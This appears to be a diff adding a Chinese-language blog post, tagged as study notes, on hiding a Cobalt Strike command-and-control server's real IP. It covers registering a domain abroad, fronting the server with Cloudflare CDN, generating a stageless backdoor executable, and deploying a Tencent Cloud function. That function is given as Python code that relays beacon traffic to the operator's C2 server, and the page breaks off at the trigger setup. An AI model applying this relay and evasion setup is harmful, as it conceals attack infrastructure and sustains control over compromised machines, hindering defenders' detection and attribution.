@@ -1,0 +1,1228 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="CobaltStrike隐匿技术">
+<title>CobaltStrike云函数配置</title>
+
+<link rel='canonical' href='https://lserein.github.io/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="CobaltStrike云函数配置">
+<meta property='og:description' content="CobaltStrike隐匿技术">
+<meta property='og:url' content='https://lserein.github.io/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/'>
+<meta property='og:site_name' content='Lsec&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-09-29T22:42:29&#43;08:00'/><meta property='article:modified_time' content='2025-09-30T13:09:08&#43;08:00'/><meta property='og:image' content='https://lserein.github.io/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/logo.jpg' />
+<meta name="twitter:title" content="CobaltStrike云函数配置">
+<meta name="twitter:description" content="CobaltStrike隐匿技术"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://lserein.github.io/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/logo.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_5a2f261f7f9cea8c.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Lsec&#39;s Blog</a></h1>
+            <h2 class="site-description">欢迎来到Lsec的博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Lserein/Lserein.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://x.com/secL15737016'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#1cdn隐匿技术">1.CDN隐匿技术</a>
+      <ol>
+        <li><a href="#11注册域名">1.1.注册域名</a></li>
+        <li><a href="#12绑定cdn">1.2.绑定CDN</a></li>
+        <li><a href="#13cs进行cdn配置隐匿真实ip">1.3.CS进行CDN配置隐匿真实IP</a></li>
+      </ol>
+    </li>
+    <li><a href="#2云函数进行隐匿">2.云函数进行隐匿</a>
+      <ol>
+        <li><a href="#21创建云函数">2.1.创建云函数</a></li>
+        <li><a href="#22创建函数服务">2.2.创建函数服务</a></li>
+        <li><a href="#23创建触发器">2.3.创建触发器</a></li>
+        <li><a href="#24配置触发器">2.4.配置触发器</a></li>
+        <li><a href="#25配置cs的服务端">2.5.配置CS的服务端</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/">
+                <img src="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/logo_hu_d3563b9cd29033c0.jpg"
+                        srcset="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/logo_hu_d3563b9cd29033c0.jpg 800w, /p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/logo_hu_6f277bc2bf89c4cb.jpg 1600w"
+                        width="800" 
+                        height="643" 
+                        loading="lazy"
+                        alt="Featured image of post CobaltStrike云函数配置" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
+                内网安全
+            </a>
+        
+            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="background-color: #2a9d8f; color: #fff;">
+                学习笔记
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/">CobaltStrike云函数配置</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            CobaltStrike隐匿技术
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Sep 29, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="1cdn隐匿技术">1.CDN隐匿技术
+</h2><h3 id="11注册域名">1.1.注册域名
+</h3><p><strong>配置CDN前提条件：需要自己有一个域名</strong></p>
+<p><strong>注册域名不推荐在国内进行注册，因为国内需要进行实名备案</strong></p>
+<p><strong>推荐注册地址：</strong><a class="link" href="https://www.namesilo.com/"  target="_blank" rel="noopener"
+    >https://www.namesilo.com/</a></p>
+<p><img src="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/1.png"
+	width="1771"
+	height="806"
+	srcset="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/1_hu_88428377975e95f1.png 480w, /p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/1_hu_e88d04f170900a8.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240611102644988"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="219"
+		data-flex-basis="527px"
+	
+></p>
+<p><strong>注册成功后去cloudflare绑定CDN</strong></p>
+<h3 id="12绑定cdn">1.2.绑定CDN
+</h3><p><strong>免费CDN地址：</strong><a class="link" href="https://dash.cloudflare.com/"  target="_blank" rel="noopener"
+    >https://dash.cloudflare.com/</a></p>
+<p><strong>注册完成后点击添加站点，将刚刚购买的域名进行添加</strong></p>
+<p><img src="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/2.png"
+	width="1883"
+	height="793"
+	srcset="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/2_hu_f1aebb34b9292f22.png 480w, /p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/2_hu_d8fef0c4601f23f1.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240611102701682"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="237"
+		data-flex-basis="569px"
+	
+></p>
+<p><strong>选择免费的，然后下一步继续即可</strong></p>
+<p><img src="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/3.png"
+	width="1385"
+	height="466"
+	srcset="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/3_hu_e1d995e514d07af4.png 480w, /p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/3_hu_4967b8f74c8825a4.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240611102712018"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="297"
+		data-flex-basis="713px"
+	
+></p>
+<p>绑定之后需要在DNS地方将NS的值复制到域名注册地址处</p>
+<p><img src="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/4.png"
+	width="2280"
+	height="1115"
+	srcset="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/4_hu_91e45ac5a3ed4f30.png 480w, /p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/4_hu_93cf1154bef74628.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240611102720803"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="204"
+		data-flex-basis="490px"
+	
+></p>
+<p>将Nameserver的值更改为cloudflare的值</p>
+<p><img src="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/5.png"
+	width="1871"
+	height="1230"
+	srcset="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/5_hu_e30e485ba82c7dd3.png 480w, /p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/5_hu_b72917902d251da1.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240611102732039"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="152"
+		data-flex-basis="365px"
+	
+></p>
+<p><strong>更改完成后需要在cloudflare上更改A记录</strong></p>
+<p><img src="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/6.png"
+	width="1804"
+	height="757"
+	srcset="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/6_hu_e9063c99c7f2e1b0.png 480w, /p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/6_hu_e4d11c29f3e8972e.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240611102743179"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="238"
+		data-flex-basis="571px"
+	
+></p>
+<p><strong>此时CDN已经配置完成，在站长之家上使用全球ping进行检测</strong></p>
+<p><img src="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/7.png"
+	width="1748"
+	height="1123"
+	srcset="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/7_hu_403df39ce944defe.png 480w, /p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/7_hu_7f4415b4c8ed255e.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240611102752526"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="155"
+		data-flex-basis="373px"
+	
+></p>
+<p>也可使用CDN在线检测进行检查</p>
+<p><strong>在线检测网站：</strong><a class="link" href="https://myssl.com/"  target="_blank" rel="noopener"
+    >https://myssl.com/</a></p>
+<p><img src="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/8.png"
+	width="1324"
+	height="690"
+	srcset="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/8_hu_1fbba9d50fca517.png 480w, /p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/8_hu_8e1fa5db91e4c3c5.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240611102803804"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="191"
+		data-flex-basis="460px"
+	
+></p>
+<h3 id="13cs进行cdn配置隐匿真实ip">1.3.CS进行CDN配置隐匿真实IP
+</h3><p><strong>CS设置监听</strong></p>
+<p><img src="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/9.png"
+	width="1766"
+	height="864"
+	srcset="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/9_hu_87ba1435b8cd3711.png 480w, /p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/9_hu_d977fdd45b25b0a7.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240611102829769"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="204"
+		data-flex-basis="490px"
+	
+></p>
+<p><strong>生成后门，需要选择无阶段的exe文件才可以上线，否则无法上线</strong></p>
+<p><img src="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/10.png"
+	width="615"
+	height="328"
+	srcset="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/10_hu_6933d3d1b62ba8bf.png 480w, /p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/10_hu_8ee872f8cc08e9f7.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240611102842422"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="187"
+		data-flex-basis="450px"
+	
+></p>
+<p><strong>此时成功上线，并且IP也变成了CDN地址</strong></p>
+<p><img src="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/11.png"
+	width="1331"
+	height="322"
+	srcset="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/11_hu_c3ba2a1182557e3b.png 480w, /p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/11_hu_e13ab016137cff0a.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240611102853457"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="413"
+		data-flex-basis="992px"
+	
+></p>
+<h2 id="2云函数进行隐匿">2.云函数进行隐匿
+</h2><p><a class="link" href="https://www.cnblogs.com/PatrickStar88888888/articles/16908221.html"  target="_blank" rel="noopener"
+    >https://www.cnblogs.com/PatrickStar88888888/articles/16908221.html</a></p>
+<h3 id="21创建云函数">2.1.创建云函数
+</h3><p><strong>登录腾讯云-云产品-云函数-函数服务-新建</strong></p>
+<p><img src="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/12.png"
+	width="2215"
+	height="755"
+	srcset="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/12_hu_233a617ae2546e22.png 480w, /p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/12_hu_c460f642c774fd17.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240611102902849"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="293"
+		data-flex-basis="704px"
+	
+></p>
+<h3 id="22创建函数服务">2.2.创建函数服务
+</h3><p><strong>选择从头开始-&gt;函数类型选择事件函数-&gt;函数名称任意-&gt;运行环境选择python3.6-&gt;并复制如下代码将代码中的C2服务器修改为自己C2服务器ip-&gt;点击完成</strong></p>
+<p><img src="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/13.png"
+	width="1919"
+	height="1053"
+	srcset="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/13_hu_80a71f6ac2a392f9.png 480w, /p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/13_hu_99e97851d141bc8c.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240611102916953"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="182"
+		data-flex-basis="437px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">-*-</span> <span class="n">coding</span><span class="p">:</span> <span class="n">utf8</span> <span class="o">-*-</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span><span class="o">,</span><span class="nn">requests</span><span class="o">,</span><span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main_handler</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">context</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">C2</span><span class="o">=</span><span class="s1">&#39;https://XXXX&#39;</span>  <span class="c1"># 修改为自己C2服务器地址</span>
+</span></span><span class="line"><span class="cl">    <span class="n">path</span><span class="o">=</span><span class="n">event</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span><span class="o">=</span><span class="n">event</span><span class="p">[</span><span class="s1">&#39;headers&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">event</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">event</span><span class="p">[</span><span class="s1">&#39;httpMethod&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span> <span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">resp</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">C2</span><span class="o">+</span><span class="n">path</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">resp</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">C2</span><span class="o">+</span><span class="n">path</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">event</span><span class="p">[</span><span class="s1">&#39;body&#39;</span><span class="p">],</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">headers</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;isBase64Encoded&#34;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;statusCode&#34;</span><span class="p">:</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;headers&#34;</span><span class="p">:</span> <span class="nb">dict</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">headers</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;body&#34;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">))[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/14.png"
+	width="2005"
+	height="1134"
+	srcset="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/14_hu_af9a00a982308619.png 480w, /p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/14_hu_6c9956df5bd5acdb.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240611102928354"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="176"
+		data-flex-basis="424px"
+	
+></p>
+<h3 id="23创建触发器">2.3.创建触发器
